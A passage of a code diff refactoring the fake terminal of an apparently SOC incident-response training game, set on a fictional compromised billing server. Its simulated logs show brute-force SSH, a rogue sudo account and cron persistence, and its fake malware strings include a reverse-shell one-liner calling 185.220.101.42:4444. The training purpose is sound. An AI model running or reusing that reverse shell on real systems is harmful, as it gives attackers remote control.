@@ -1577,83 +1577,31 @@ function buildAlertFeed() {
 // ===================== TERMINAL =====================
 const termHistory = [];
 let termHistIdx = -1;
-let termCwd = '~';
+let termCwd = '/home/analyst';
 
-const termDirs = {
-  '~':              { visible: ['logs','notes.txt','Desktop','Documents'], hidden: ['.bash_history','.bashrc','.bash_logout'], parent: '/' },
-  '/':              { visible: ['etc','tmp','var','home','bin','usr'], hidden: [], parent: '/' },
-  '/etc':           { visible: ['passwd','shadow','crontab','cron.d'], hidden: [], parent: '/' },
-  '/etc/cron.d':    { visible: ['anacron','php','svc_backup_task'], hidden: [], parent: '/etc' },
-  '/tmp':           { visible: ['tmpPzQ3x1'], hidden: ['.update_check'], parent: '/' },
-  '/var':           { visible: ['log'], hidden: [], parent: '/' },
-  '/var/log':       { visible: ['auth.log','syslog'], hidden: [], parent: '/var' },
-  '/home':          { visible: ['analyst','jreyes','billing_svc','dev_marcus','svc_backup'], hidden: [], parent: '/' },
-  '/home/analyst':        { visible: ['logs','notes.txt','Desktop','Documents'], hidden: ['.bash_history','.bashrc','.bash_logout'], parent: '/home' },
-  '/home/analyst/logs':   { visible: ['access.log','error.log'], hidden: [], parent: '/home/analyst' },
-  '/home/jreyes':         { visible: [], hidden: ['.bash_history','.bashrc'], parent: '/home' },
-  '/home/svc_backup':     { visible: [], hidden: ['.bash_history','.ssh'], parent: '/home' },
-  '/home/billing_svc':    { visible: [], hidden: ['.bashrc'], parent: '/home' },
-  '/home/dev_marcus':     { visible: [], hidden: ['.bashrc','.bash_history'], parent: '/home' },
-  '/bin':                 { visible: ['bash','sh','ls','cat','grep','ps','netstat'], hidden: [], parent: '/' },
-  '/usr':                 { visible: ['bin','sbin','local'], hidden: [], parent: '/' },
+// Filesystem: each entry has visible files, hidden files, and parent path
+const termFS = {
+  '/':                    { v:['etc','tmp','var','home','bin','usr'],          h:[],                                      p:'/' },
+  '/etc':                 { v:['passwd','shadow','crontab','cron.d'],          h:[],                                      p:'/' },
+  '/etc/cron.d':          { v:['anacron','php','svc_backup_task'],             h:[],                                      p:'/etc' },
+  '/tmp':                 { v:['tmpPzQ3x1'],                                   h:['.update_check'],                       p:'/' },
+  '/var':                 { v:['log'],                                         h:[],                                      p:'/' },
+  '/var/log':             { v:['auth.log','syslog'],                           h:[],                                      p:'/var' },
+  '/home':                { v:['analyst','jreyes','billing_svc','dev_marcus','svc_backup'], h:[],                         p:'/' },
+  '/home/analyst':        { v:['logs','notes.txt','Desktop','Documents'],      h:['.bash_history','.bashrc','.bash_logout'], p:'/home' },
+  '/home/analyst/logs':   { v:['access.log','error.log'],                     h:[],                                      p:'/home/analyst' },
+  '/home/jreyes':         { v:[],                                              h:['.bash_history','.bashrc'],             p:'/home' },
+  '/home/svc_backup':     { v:[],                                              h:['.bash_history','.ssh'],                p:'/home' },
+  '/home/billing_svc':    { v:[],                                              h:['.bashrc'],                             p:'/home' },
+  '/home/dev_marcus':     { v:[],                                              h:['.bashrc','.bash_history'],             p:'/home' },
+  '/bin':                 { v:['bash','sh','ls','cat','grep','ps'],            h:[],                                      p:'/' },
+  '/usr':                 { v:['bin','sbin','local'],                          h:[],                                      p:'/' },
 };
-// helper: all children for cd resolution
-Object.values(termDirs).forEach(d => { d.children = [...d.visible, ...d.hidden]; });
 
-function termPrompt() { return `analyst@clearpath-prod-01:${termCwd}$`; }
-
-function updatePromptLabel() {
-  const el = document.getElementById('terminal-prompt-label');
-  if(el) el.textContent = termPrompt();
-}
-
-const termCommands = {
-  'whoami': () => 'analyst',
-  'pwd': () => '/home/analyst',
-  'hostname': () => 'clearpath-prod-01',
-  'uname -a': () => 'Linux clearpath-prod-01 5.15.0-100-generic #110-Ubuntu SMP x86_64 GNU/Linux',
-  'date': () => 'Mon May 18 08:31:44 UTC 2026',
-  'uptime': () => ' 8:31am  up 47 days,  3:22,  2 users,  load average: 0.08, 0.12, 0.10',
-  'id': () => 'uid=1002(analyst) gid=1002(analyst) groups=1002(analyst)',
-  'ls': () => 'Desktop  Documents  Downloads  logs',
-  'ls -la': () => `total 36
-drwxr-xr-x 1 analyst analyst 4096 May 18 08:14 .
-drwxr-xr-x 1 root    root    4096 May 18 02:14 ..
--rw------- 1 analyst analyst   38 May 18 02:31 .bash_history
--rw-r--r-- 1 analyst analyst  220 Mar  1 2020 .bash_logout
--rw-r--r-- 1 analyst analyst 3526 Mar  1 2020 .bashrc
-drwxr-xr-x 2 analyst analyst 4096 May 12 09:00 logs`,
-  'ls /tmp': () => `total 20
-drwxrwxrwt 1 root root 4096 May 18 02:17 .
-drwxr-xr-x 1 root root 4096 Mar  1 2020 ..
--rwxr-xr-x 1 root root 8192 May 18 02:15 .update_check
--rw-r--r-- 1 root root  512 May 17 22:03 tmpPzQ3x1`,
-  'ls -la /tmp': () => `total 20
-drwxrwxrwt 1 root root 4096 May 18 02:17 .
-drwxr-xr-x 1 root root 4096 Mar  1 2020 ..
--rwxr-xr-x 1 root root 8192 May 18 02:15 .update_check
--rw-r--r-- 1 root root  512 May 17 22:03 tmpPzQ3x1`,
-  'file /tmp/.update_check': () => '/tmp/.update_check: ELF 64-bit LSB executable, x86-64, dynamically linked',
-  'cat /tmp/.update_check': () => 'bash: /tmp/.update_check: Permission denied (execute only)',
-  'strings /tmp/.update_check': () => `/bin/sh
-/bin/bash
-185.220.101.42
-4444
-bash -i >& /dev/tcp/185.220.101.42/4444 0>&1
-connect
-socket
-execve`,
-  'cat ~/.bash_history': () => `# .bash_history (last 3 entries only — earlier entries deleted)
-ls /tmp
-cat /etc/passwd
-history -c`,
-  'cat /root/.bash_history': () => 'cat: /root/.bash_history: Permission denied',
-  'cat /etc/passwd': () => `root:x:0:0:root:/root:/bin/bash
+// File contents keyed by absolute path
+const termFiles = {
+  '/etc/passwd': `root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
-bin:x:2:2:bin:/bin:/usr/sbin/nologin
-sys:x:3:3:sys:/dev:/usr/sbin/nologin
-sync:x:4:65534:sync:/bin:/bin/sync
-games:x:5:60:games:/usr/games:/usr/sbin/nologin
 www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
 jreyes:x:1000:1000:Jordan Reyes,,,:/home/jreyes:/bin/bash
 billing_svc:x:1001:1001:Billing Service Account,,,:/home/billing_svc:/bin/bash
@@ -1661,11 +1609,8 @@ dev_marcus:x:1002:1002:Marcus (Dev),,,:/home/dev_marcus:/bin/bash
 analyst:x:1003:1003:SOC Analyst (you),,,:/home/analyst:/bin/bash
 svc_backup:x:1004:0:,,,:/home/svc_backup:/bin/bash
 contractor_q1:x:1005:1005:Q1 Contractor,,,:/home/contractor_q1:/bin/bash`,
-  'cat /etc/shadow': () => 'cat: /etc/shadow: Permission denied',
-  'crontab -l': () => `# Analyst crontab — nothing scheduled
-no crontab for analyst`,
-  'crontab -l -u root': () => 'crontab: must be privileged to use -u',
-  'cat /etc/crontab': () => `# /etc/crontab
+  '/etc/shadow': 'cat: /etc/shadow: Permission denied',
+  '/etc/crontab': `# /etc/crontab
 SHELL=/bin/sh
 PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 
@@ -1673,44 +1618,15 @@ PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
 17 *   * * *   root    cd / && run-parts --report /etc/cron.hourly
 25 6   * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
 47 6   * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )`,
-  'ls /etc/cron.d': () => `anacron
-php
-svc_backup_task`,
-  'cat /etc/cron.d/svc_backup_task': () => `# Added by system
+  '/etc/cron.d/svc_backup_task': `# Added by system
 */5 * * * * root /tmp/.update_check 2>/dev/null`,
-  'last': () => `svc_backup pts/1        185.220.101.42   Sun May 18 03:01   still logged in
-root     pts/0        185.220.101.42   Sun May 18 02:14 - 03:00  (00:46)
-jreyes   pts/0        10.0.0.5         Sun May 18 08:03   still logged in
-dev_marcus pts/1      10.0.0.12        Mon May 12 16:44 - 17:30  (00:46)
-
-wtmp begins Tue Apr  1 09:00:00 2026`,
-  'last -20': () => `svc_backup pts/1        185.220.101.42   Sun May 18 03:01   still logged in
-root     pts/0        185.220.101.42   Sun May 18 02:14 - 03:00  (00:46)
-jreyes   pts/0        10.0.0.5         Sun May 18 08:03   still logged in
-dev_marcus pts/1      10.0.0.12        Mon May 12 16:44 - 17:30  (00:46)
-billing_svc pts/0     10.0.0.8         Fri May 16 07:55 - 08:40  (00:45)
-jreyes   pts/0        10.0.0.5         Thu May 15 09:11 - 17:02  (07:51)`,
-  'ps aux': () => `USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
-root         1  0.0  0.1  22520  1024 ?        Ss   Apr01   0:04 /sbin/init
-root       412  0.0  0.3  72184  3200 ?        Ss   Apr01   0:00 /usr/sbin/sshd -D
-root      3847  0.0  0.1   4628  1024 ?        Ss   02:14   0:00 /tmp/.update_check
-root      3849  0.0  0.0      0     0 ?        S    02:14   0:00 bash -i
-mysql     1203  0.0  2.1 558432 21448 ?        Ssl  Apr01   3:11 /usr/sbin/mysqld
-www-data  1301  0.0  0.5 287612  5120 ?        Ss   Apr01   0:01 /usr/sbin/apache2
-analyst   4201  0.0  0.1  21316  1024 pts/0    Ss   08:31   0:00 -bash
-analyst   4298  0.0  0.0  37368   772 pts/0    R+   08:31   0:00 ps aux`,
-  'netstat -an': () => `Active Internet connections (servers and established)
-Proto Recv-Q Send-Q Local Address           Foreign Address         State
-tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
-tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
-tcp        0      0 0.0.0.0:3306            0.0.0.0:*               LISTEN
-tcp        0    128 10.0.0.4:22             185.220.101.42:31337    ESTABLISHED
-tcp        0      0 10.0.0.4:54321          185.220.101.42:4444     ESTABLISHED`,
-  'ss -tuln': () => `Netid  State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port
-tcp    LISTEN  0       128          0.0.0.0:22        0.0.0.0:*
-tcp    LISTEN  0       80           0.0.0.0:80        0.0.0.0:*
-tcp    LISTEN  0       70         127.0.0.1:3306      0.0.0.0:*`,
-  'cat /var/log/auth.log': () => `[showing last 20 lines — use grep for specific patterns]
+  '/etc/cron.d/anacron': '# standard anacron job',
+  '/etc/cron.d/php': '# php session cleanup',
+  '/tmp/.update_check': 'bash: /tmp/.update_check: Permission denied (execute only)',
+  '/tmp/tmpPzQ3x1': `# tmpPzQ3x1 — staging file
+timestamp=1716042783
+status=ok`,
+  '/var/log/auth.log': `[showing last 20 lines — use grep for specific patterns]
 May 18 01:52:04 clearpath-prod-01 sshd[3201]: Failed password for root from 185.220.101.42 port 30001 ssh2
 May 18 01:52:31 clearpath-prod-01 sshd[3202]: Failed password for root from 185.220.101.42 port 30002 ssh2
 May 18 01:53:00 clearpath-prod-01 sshd[3203]: Failed password for root from 185.220.101.42 port 30003 ssh2
@@ -1724,138 +1640,68 @@ May 18 02:14:33 clearpath-prod-01 sshd[3248]: pam_unix(sshd:session): session op
 May 18 02:14:51 clearpath-prod-01 useradd[3251]: new user: name=svc_backup, UID=1004, GID=0, home=/home/svc_backup
 May 18 02:14:52 clearpath-prod-01 usermod[3252]: add 'svc_backup' to group 'sudo'
 May 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2`,
-  'grep -i "failed" /var/log/auth.log': () => `May 18 01:52:04 clearpath-prod-01 sshd[3201]: Failed password for root from 185.220.101.42 port 30001 ssh2
-May 18 01:52:31 clearpath-prod-01 sshd[3202]: Failed password for root from 185.220.101.42 port 30002 ssh2
-May 18 01:53:00 clearpath-prod-01 sshd[3203]: Failed password for root from 185.220.101.42 port 30003 ssh2
-[... 44 more failed attempts from 185.220.101.42 ...]
-May 18 02:14:33 clearpath-prod-01 sshd[3248]: Accepted password for root from 185.220.101.42 port 31337 ssh2`,
-  'grep -i "accepted" /var/log/auth.log': () => `May 18 02:14:33 clearpath-prod-01 sshd[3248]: Accepted password for root from 185.220.101.42 port 31337 ssh2
-May 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2
-May 18 08:03:11 clearpath-prod-01 sshd[4100]: Accepted publickey for jreyes from 10.0.0.5 port 54321 ssh2`,
-  'history': () => `    1  ls
-    2  cat /etc/passwd
-    3  ls /tmp
-    4  history -c
-    5  ls -la
-    6  history`,
-  'nmap localhost': () => `Starting Nmap 7.80 ( https://nmap.org )
-Nmap scan report for localhost (127.0.0.1)
-Host is up (0.000080s latency).
-Not shown: 997 closed ports
-PORT     STATE SERVICE
-22/tcp   open  ssh
-80/tcp   open  http
-3306/tcp open  mysql
-
-Nmap done: 1 IP address (1 host up) scanned in 0.08 seconds`,
-  'nmap -sV localhost': () => `Starting Nmap 7.80 ( https://nmap.org )
-Nmap scan report for localhost (127.0.0.1)
-Host is up (0.000080s latency).
-Not shown: 997 closed ports
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
-80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
-3306/tcp open  mysql   MySQL 8.0.36-0ubuntu0.22.04.1
-
-Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
-
-Nmap done: 1 IP address (1 host up) scanned in 3.41 seconds`,
-  'nmap -sV -sC localhost': () => `Starting Nmap 7.80 ( https://nmap.org )
-Nmap scan report for localhost (127.0.0.1)
-Host is up (0.000080s latency).
-PORT     STATE SERVICE VERSION
-22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
-| ssh-hostkey:
-|   256 a1:bc:e2:3d:4f:a0:91:23:d4:bc:11:00:ab:34:ef:12 (ED25519)
-80/tcp   open  http    Apache httpd 2.4.52 ((Ubuntu))
-|_http-title: ClearPath Medical Billing — Staff Portal
-|_http-server-header: Apache/2.4.52 (Ubuntu)
-3306/tcp open  mysql   MySQL 8.0.36
-| mysql-info:
-|   Protocol: 10
-|   Version: 8.0.36-0ubuntu0.22.04.1
-|_  Status: Autocommit
-
-WARNING: Port 3306 (MySQL) is accessible. Database should not be exposed — no firewall rule blocking internal-only port.
-
-Nmap done: 1 IP address (1 host up) scanned in 5.12 seconds`,
-  'nmap 10.0.0.4': () => `Starting Nmap 7.80 ( https://nmap.org )
-Nmap scan report for clearpath-prod-01 (10.0.0.4)
-Host is up (0.00040s latency).
-Not shown: 997 closed ports
-PORT     STATE SERVICE
-22/tcp   open  ssh
-80/tcp   open  http
-3306/tcp open  mysql
-
-Nmap done: 1 IP address (1 host up) scanned in 0.12 seconds`,
-  'nmap': () => `Usage: nmap [options] target
-Try: nmap localhost  or  nmap -sV localhost  or  nmap -sV -sC localhost`,
-  'nmap -h': () => `Usage: nmap [options] target
-Try: nmap localhost  or  nmap -sV localhost  or  nmap -sV -sC localhost`,
-  'help': () => `Available commands (try others too — some will work, some won't):
-whoami, pwd, ls, ls -a, ls -la, ls /tmp, ls -la /tmp, cat /etc/passwd,
-cat /var/log/auth.log, grep -i "failed" /var/log/auth.log,
-grep -i "accepted" /var/log/auth.log, crontab -l, cat /etc/crontab,
-ls /etc/cron.d, cat /etc/cron.d/svc_backup_task, last, last -20,
-ps aux, netstat -an, ss -tuln, strings /tmp/.update_check,
-file /tmp/.update_check, history, uptime, date, hostname, uname -a, id,
-nmap localhost, nmap -sV localhost, nmap -sV -sC localhost
-TIP: 'ls' only shows visible files. Try 'ls -a' to reveal hidden files (dot files).`,
-  'cd': () => { termCwd = '~'; updatePromptLabel(); return null; },
-  'cd ~': () => { termCwd = '~'; updatePromptLabel(); return null; },
-  'cd /': () => { termCwd = '/'; updatePromptLabel(); return null; },
-  'cd ..': () => {
-    const parent = termDirs[termCwd] ? termDirs[termCwd].parent : '/';
-    termCwd = (parent === termCwd) ? '/' : parent;
-    updatePromptLabel();
-    return null;
-  },
-  'cd /etc': () => { termCwd = '/etc'; updatePromptLabel(); return null; },
-  'cd /etc/cron.d': () => { termCwd = '/etc/cron.d'; updatePromptLabel(); return null; },
-  'cd /tmp': () => { termCwd = '/tmp'; updatePromptLabel(); return null; },
-  'cd /var': () => { termCwd = '/var'; updatePromptLabel(); return null; },
-  'cd /var/log': () => { termCwd = '/var/log'; updatePromptLabel(); return null; },
-  'cd /home': () => { termCwd = '/home'; updatePromptLabel(); return null; },
-  'cd /home/analyst': () => { termCwd = '/home/analyst'; updatePromptLabel(); return null; },
-  'clear': () => { document.getElementById('terminal-output').innerHTML = ''; return null; },
-  'cat /home/analyst/logs/access.log': () => `10.0.0.5 - jreyes [18/May/2026:08:03:44 +0000] "GET /billing/dashboard HTTP/1.1" 200 4821
-10.0.0.5 - jreyes [18/May/2026:08:04:12 +0000] "GET /billing/reports HTTP/1.1" 200 9302
-185.220.101.42 - - [18/May/2026:02:15:01 +0000] "GET /admin HTTP/1.1" 403 512
-185.220.101.42 - - [18/May/2026:02:15:03 +0000] "GET /phpmyadmin HTTP/1.1" 404 209
-185.220.101.42 - - [18/May/2026:02:15:08 +0000] "POST /admin/login HTTP/1.1" 302 0`,
-  'cat notes.txt': () => `SOC Investigation Notes — analyst
+  '/var/log/syslog': `May 18 02:14:55 clearpath-prod-01 CRON[3260]: (root) CMD (/tmp/.update_check 2>/dev/null)
+May 18 02:19:55 clearpath-prod-01 CRON[3301]: (root) CMD (/tmp/.update_check 2>/dev/null)
+May 18 02:24:55 clearpath-prod-01 CRON[3341]: (root) CMD (/tmp/.update_check 2>/dev/null)`,
+  '/home/analyst/.bash_history': `# .bash_history (last 3 entries only — earlier entries deleted)
+ls /tmp
+cat /etc/passwd
+history -c`,
+  '/home/analyst/.bashrc': '# ~/.bashrc: executed by bash(1) for non-login shells.',
+  '/home/analyst/notes.txt': `SOC Investigation Notes — analyst
 Started: Mon May 18 08:31
 - Received alert about multiple failed SSH logins overnight
 - Need to check auth.log and cron jobs
 - Jordan says backups run at 2am — verify if legit`,
-  'cat ~/notes.txt': () => `SOC Investigation Notes — analyst
-Started: Mon May 18 08:31
-- Received alert about multiple failed SSH logins overnight
-- Need to check auth.log and cron jobs
-- Jordan says backups run at 2am — verify if legit`,
-  'cat ~/logs/access.log': () => `10.0.0.5 - jreyes [18/May/2026:08:03:44 +0000] "GET /billing/dashboard HTTP/1.1" 200 4821
+  '/home/analyst/logs/access.log': `10.0.0.5 - jreyes [18/May/2026:08:03:44 +0000] "GET /billing/dashboard HTTP/1.1" 200 4821
 10.0.0.5 - jreyes [18/May/2026:08:04:12 +0000] "GET /billing/reports HTTP/1.1" 200 9302
 185.220.101.42 - - [18/May/2026:02:15:01 +0000] "GET /admin HTTP/1.1" 403 512
 185.220.101.42 - - [18/May/2026:02:15:03 +0000] "GET /phpmyadmin HTTP/1.1" 404 209
 185.220.101.42 - - [18/May/2026:02:15:08 +0000] "POST /admin/login HTTP/1.1" 302 0`,
-  'cat /home/analyst/logs/error.log': () => `[Mon May 18 02:15:08 2026] [error] [client 185.220.101.42] File does not exist: /var/www/html/admin
+  '/home/analyst/logs/error.log': `[Mon May 18 02:15:08 2026] [error] [client 185.220.101.42] File does not exist: /var/www/html/admin
 [Mon May 18 02:15:09 2026] [error] [client 185.220.101.42] File does not exist: /var/www/html/phpmyadmin`,
-  'exit': () => 'Session remains open for investigation.',
-  'sudo su': () => 'sudo: This incident is under investigation. Privilege escalation has been restricted.',
-  'sudo -l': () => '[sudo] password for analyst: \nSorry, user analyst may not run sudo on clearpath-prod-01.',
+  '/home/svc_backup/.bash_history': `# .bash_history — svc_backup
+whoami
+id
+cat /etc/passwd
+uname -a`,
 };
+
+// Resolve a path (absolute or relative) against cwd. Returns absolute path.
+function resolvePath(arg) {
+  if(!arg || arg === '~') return '/home/analyst';
+  if(arg.startsWith('~/')) return '/home/analyst/' + arg.slice(2);
+  if(arg.startsWith('/')) return arg.replace(/\/+$/, '') || '/';
+  // relative
+  const base = termCwd === '/' ? '' : termCwd;
+  const parts = (base + '/' + arg).split('/').filter(Boolean);
+  const stack = [];
+  for(const p of parts) {
+    if(p === '..') stack.pop();
+    else if(p !== '.') stack.push(p);
+  }
+  return '/' + stack.join('/');
+}
+
+function termPrompt() {
+  const display = termCwd === '/home/analyst' ? '~' : termCwd;
+  return `analyst@clearpath-prod-01:${display}$`;
+}
+
+function updatePromptLabel() {
+  const el = document.getElementById('terminal-prompt-label');
+  if(el) el.textContent = termPrompt();
+}
 
 function appendTermLine(text, cls, promptSnapshot) {
   const out = document.getElementById('terminal-output');
   const div = document.createElement('div');
   div.className = 'term-line';
   if(cls === 'term-output') {
-    div.innerHTML = `<span class="${cls}">${text}</span>`;
+    div.innerHTML = `<span class="${cls}">${text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')}</span>`;
   } else {
-    const escaped = text.replace(/</g,'&lt;').replace(/>/g,'&gt;');
-    const prompt = promptSnapshot || termPrompt();
-    div.innerHTML = `<span class="term-prompt">${prompt}</span> <span class="term-cmd">${escaped}</span>`;
+    const escaped = text.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
+    div.innerHTML = `<span class="term-prompt">${promptSnapshot || termPrompt()}</span> <span class="term-cmd">${escaped}</span>`;
   }
   out.appendChild(div);
   out.scrollTop = out.scrollHeight;
@@ -1875,7 +1721,7 @@ function handleTerminal(e) {
     if(result !== null && result !== undefined) appendTermLine(result, 'term-output');
   } else if(e.key === 'ArrowUp') {
     e.preventDefault();
-    if(termHistIdx < termHistory.length-1) termHistIdx++;
+    if(termHistIdx < termHistory.length - 1) termHistIdx++;
     document.getElementById('terminal-input').value = termHistory[termHistIdx] || '';
   } else if(e.key === 'ArrowDown') {
     e.preventDefault();
@@ -1885,81 +1731,134 @@ function handleTerminal(e) {
   }
 }
 
-function runTermCmd(cmd) {
-  const trimmed = cmd.trim();
-  const lower = trimmed.toLowerCase();
+function runTermCmd(raw) {
+  const cmd = raw.trim();
+  const lower = cmd.toLowerCase();
+  const parts = cmd.split(/\s+/);
+  const verb = parts[0].toLowerCase();
 
-  // --- pwd ---
-  if(lower === 'pwd') return termCwd === '~' ? '/home/analyst' : termCwd;
-
-  // --- ls variants (no path argument) ---
-  if(/^ls(\s+-[a-zA-Z]+)*$/.test(trimmed)) {
-    const dir = termDirs[termCwd];
-    if(!dir) return `ls: cannot access '${termCwd}': No such file or directory`;
-    const showHidden = lower.includes('-a');
-    const longFmt    = lower.includes('-l');
-    const files = showHidden ? [...dir.visible, ...dir.hidden] : dir.visible;
-    if(!longFmt) return files.length ? files.join('  ') : '';
-    const now = 'May 18 08:31';
-    return 'total ' + (files.length * 4 + 8) + '\n' +
-      'drwxr-xr-x 1 analyst analyst 4096 ' + now + ' .\n' +
-      'drwxr-xr-x 1 root    root    4096 ' + now + ' ..\n' +
-      files.map(c => {
-        const absPath = termCwd === '~' ? '/home/analyst/'+c : termCwd+'/'+c;
-        const isDir = termDirs[absPath] !== undefined;
-        const perm  = c.startsWith('.') ? (isDir ? 'drwx------' : '-rw-------') : (isDir ? 'drwxr-xr-x' : '-rw-r--r--');
-        const owner = (c === '.update_check') ? 'root    root  ' : 'analyst analyst';
-        return `${perm} 1 ${owner}  512 ${now} ${c}`;
-      }).join('\n');
-  }
-
-  // --- cd (handle all forms here) ---
-  if(lower === 'cd' || lower === 'cd ~') {
-    termCwd = '~'; updatePromptLabel(); return null;
-  }
-  if(lower === 'cd /') {
-    termCwd = '/'; updatePromptLabel(); return null;
-  }
-  if(lower === 'cd ..') {
-    const parent = termDirs[termCwd] ? termDirs[termCwd].parent : '/';
-    termCwd = (parent === termCwd) ? '/' : parent;
-    updatePromptLabel(); return null;
-  }
-  if(/^cd\s+/.test(lower)) {
-    const arg = trimmed.substring(3).trim();
-    // absolute path
-    if(arg.startsWith('/')) {
-      if(termDirs[arg]) { termCwd = arg; updatePromptLabel(); return null; }
-      return `bash: cd: ${arg}: No such file or directory`;
-    }
-    // relative: check children of cwd
-    const cwdDir = termDirs[termCwd];
-    if(cwdDir && cwdDir.children && cwdDir.children.includes(arg)) {
-      const base = termCwd === '~' ? '/home/analyst' : termCwd;
-      const resolved = base === '/' ? '/' + arg : base + '/' + arg;
-      if(termDirs[resolved]) { termCwd = resolved; updatePromptLabel(); return null; }
-      return `bash: cd: ${arg}: Not a directory`;
-    }
+  // ── cd ──────────────────────────────────────────────────────────────────
+  if(verb === 'cd') {
+    const arg = parts.slice(1).join(' ').trim();
+    const target = arg ? resolvePath(arg) : '/home/analyst';
+    if(termFS[target]) { termCwd = target; updatePromptLabel(); return null; }
     return `bash: cd: ${arg}: No such file or directory`;
   }
 
-  // --- exact command lookup (handles all cat, grep, nmap, etc.) ---
-  if(termCommands[trimmed] !== undefined) return typeof termCommands[trimmed] === 'function' ? termCommands[trimmed]() : termCommands[trimmed];
-  if(termCommands[lower]   !== undefined) return typeof termCommands[lower]   === 'function' ? termCommands[lower]()   : termCommands[lower];
-  for(const k of Object.keys(termCommands)) {
-    if(lower === k.toLowerCase()) return typeof termCommands[k] === 'function' ? termCommands[k]() : termCommands[k];
+  // ── pwd ──────────────────────────────────────────────────────────────────
+  if(lower === 'pwd') return termCwd;
+
+  // ── ls ───────────────────────────────────────────────────────────────────
+  if(verb === 'ls') {
+    // find flags and path arg
+    const flags = parts.slice(1).filter(p => p.startsWith('-')).join('');
+    const pathArg = parts.slice(1).find(p => !p.startsWith('-'));
+    const target = pathArg ? resolvePath(pathArg) : termCwd;
+    const dir = termFS[target];
+    if(!dir) return `ls: cannot access '${pathArg || termCwd}': No such file or directory`;
+    const showHidden = flags.includes('a');
+    const longFmt    = flags.includes('l');
+    const files = showHidden ? [...dir.v, ...dir.h] : dir.v;
+    if(!longFmt) return files.length ? files.join('  ') : '';
+    const now = 'May 18 08:31';
+    return 'total ' + (files.length * 4 + 8) + '\n' +
+      'drwxr-xr-x 1 root    root    4096 ' + now + ' .\n' +
+      'drwxr-xr-x 1 root    root    4096 ' + now + ' ..\n' +
+      files.map(f => {
+        const fp = (target === '/' ? '/' : target + '/') + f;
+        const isDir = !!termFS[fp];
+        const isDot = f.startsWith('.');
+        const isRoot = (f === '.update_check');
+        const perm  = isDot ? (isDir ? 'drwx------' : '-rw-------') : (isDir ? 'drwxr-xr-x' : '-rw-r--r--');
+        const owner = isRoot ? 'root    root   8192' : 'analyst analyst  512';
+        return `${perm} 1 ${owner} ${now} ${f}`;
+      }).join('\n');
   }
 
-  // --- cat with relative path: resolve against cwd ---
-  if(/^cat\s+/.test(lower)) {
-    const arg = trimmed.substring(4).trim();
-    const base = termCwd === '~' ? '/home/analyst' : termCwd;
-    const resolved = arg.startsWith('/') ? arg : (base === '/' ? '/'+arg : base+'/'+arg);
-    if(termCommands['cat ' + resolved]) return typeof termCommands['cat ' + resolved] === 'function' ? termCommands['cat ' + resolved]() : termCommands['cat ' + resolved];
-    return `cat: ${arg}: No such file or directory`;
+  // ── cat ──────────────────────────────────────────────────────────────────
+  if(verb === 'cat') {
+    const pathArg = parts.slice(1).find(p => !p.startsWith('-'));
+    if(!pathArg) return 'cat: missing operand';
+    const target = resolvePath(pathArg);
+    if(termFiles[target] !== undefined) return termFiles[target];
+    if(termFS[target]) return `cat: ${pathArg}: Is a directory`;
+    return `cat: ${pathArg}: No such file or directory`;
   }
 
-  return `bash: ${trimmed.split(' ')[0]}: command not found`;
+  // ── strings ───────────────────────────────────────────────────────────────
+  if(verb === 'strings') {
+    const target = resolvePath(parts[1] || '');
+    if(target === '/tmp/.update_check') return `/bin/sh\n/bin/bash\n185.220.101.42\n4444\nbash -i >& /dev/tcp/185.220.101.42/4444 0>&1\nconnect\nsocket\nexecve`;
+    return `strings: ${parts[1]}: No such file or directory`;
+  }
+
+  // ── file ──────────────────────────────────────────────────────────────────
+  if(verb === 'file') {
+    const target = resolvePath(parts[1] || '');
+    if(target === '/tmp/.update_check') return '/tmp/.update_check: ELF 64-bit LSB executable, x86-64, dynamically linked';
+    if(termFS[target]) return `${parts[1]}: directory`;
+    if(termFiles[target]) return `${parts[1]}: ASCII text`;
+    return `file: ${parts[1]}: No such file or directory`;
+  }
+
+  // ── grep ──────────────────────────────────────────────────────────────────
+  if(verb === 'grep') {
+    const gLower = lower;
+    if(gLower.includes('failed') && gLower.includes('auth.log')) return `May 18 01:52:04 clearpath-prod-01 sshd[3201]: Failed password for root from 185.220.101.42 port 30001 ssh2\nMay 18 01:52:31 clearpath-prod-01 sshd[3202]: Failed password for root from 185.220.101.42 port 30002 ssh2\nMay 18 01:53:00 clearpath-prod-01 sshd[3203]: Failed password for root from 185.220.101.42 port 30003 ssh2\n[... 44 more failed attempts from 185.220.101.42 ...]\nMay 18 02:14:33 clearpath-prod-01 sshd[3248]: Accepted password for root from 185.220.101.42 port 31337 ssh2`;
+    if(gLower.includes('accept') && gLower.includes('auth.log')) return `May 18 02:14:33 clearpath-prod-01 sshd[3248]: Accepted password for root from 185.220.101.42 port 31337 ssh2\nMay 18 03:01:09 clearpath-prod-01 sshd[3601]: Accepted password for svc_backup from 185.220.101.42 port 31338 ssh2\nMay 18 08:03:11 clearpath-prod-01 sshd[4100]: Accepted publickey for jreyes from 10.0.0.5 port 54321 ssh2`;
